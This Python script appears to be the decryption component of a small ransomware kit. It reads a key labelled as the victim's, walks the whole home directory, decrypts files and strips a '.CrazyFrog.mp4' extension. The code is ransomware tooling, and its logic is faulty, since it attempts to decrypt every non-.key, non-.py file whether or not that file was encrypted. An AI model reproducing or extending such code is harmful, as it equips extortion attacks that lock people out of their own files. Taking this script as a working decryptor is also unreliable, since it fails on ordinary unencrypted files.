
#############[Packages]#############
###### cryptography package has our Fernet Symetric Encryption
######  ↳ AES in CBC mode with a 128-bit key for encryption; using PKCS7 padding.
######    HMAC using SHA256 for authentication.
from cryptography.fernet import Fernet
import os
import glob #finds all the pathnames matching a specified pattern
####################################



############[Open Victim's Key]############
file = open('secret.key', 'rb')
key = file.read()
file.close()
fernet = Fernet(key)
###########################################



############[Directory Setup]############
homeDir = os.path.expanduser('~')   #Grabs our home folder
files = glob.glob(f'{homeDir}/**/*.*', recursive=True) #Looks at everything in our Home Directory
#########################################



############[Targeting Files]############
###### Possibly unnecessary
file_list=[]
for filename in files:
    if ".key" not in filename and ".py" not in filename:
        file_list.append(filename)
#########################################



############[Decrypting Files]############
for file in file_list:
    with open(file, 'rb') as f:
        f_bytes = f.read()
        
    f_bytes_decrypt = fernet.decrypt(f_bytes)
    
    fileName = str(file).replace('.CrazyFrog.mp4','')   #Replaces our Encrypted File's Extension with the file's Original Extensions
    
    decFile = fileName   #Build our Decrypted file, Filename without the CrazyFrog.mp4 extension, possibly unnecessary 
          
    with open(decFile,'wb') as f:
        f.write(f_bytes_decrypt)   #Writes our decrypted bytes to the file with the Original Extensions
        os.remove(file)            #Removes the old encrypted file
##########################################



print("successfully decrypted all files")